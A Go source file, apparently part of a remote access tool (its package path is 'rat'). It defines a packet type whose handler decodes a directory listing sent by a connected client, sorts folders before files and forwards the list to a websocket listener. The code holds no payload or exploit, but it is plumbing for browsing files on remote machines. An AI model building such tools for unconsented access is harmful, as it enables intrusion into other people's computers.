package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type DirectoryPacket struct {
	Path  string
	Files []File
}

func (packet DirectoryPacket) Header() header.PacketHeader {
	return header.DirectoryHeader
}

func (packet DirectoryPacket) Init(c *Client) {

}

type File struct {
	Dir  bool
	Name string
	Size int64
	Time string
}

func (packet DirectoryPacket) OnReceive(c *Client) error {
	dirs := make([]File, 0)
	files := make([]File, 0)

	for _, file := range packet.Files {
		file := File{file.Dir, file.Name, file.Size, file.Time}

		if file.Dir {
			dirs = append(dirs, file)
		} else {
			files = append(files, file)
		}
	}

	if ws, ok := c.Listeners[header.DirectoryHeader]; ok {
		err := sendMessage(ws, c, DirectoryListMessage(append(dirs, files...)))

		if err != nil {
			return err
		}
	}

	delete(c.Listeners, header.DirectoryHeader)

	return nil
}

func (packet DirectoryPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
